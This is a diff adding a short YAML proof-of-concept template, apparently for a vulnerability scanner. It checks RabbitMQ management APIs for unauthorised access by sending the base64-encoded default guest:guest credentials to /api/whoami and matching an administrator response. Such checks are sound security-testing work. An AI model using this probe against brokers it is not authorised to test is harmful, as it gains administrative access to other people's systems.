@@ -1,0 +1,19 @@
+id: poc-yaml-rabbitmq-unauthorized-access
+info:
+  name: RabbitMQ 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: RabbitMQ
+  osprey-id: vb_2018_0037
+requests:
+- method: GET
+  path: /api/whoami
+  headers:
+    Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D
+    Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+  expression: 'status_code == 200 && contains(body, "name\":\"guest\",\"tags\":\"administrator")
+
+    '
+variables: {}
+transport: http
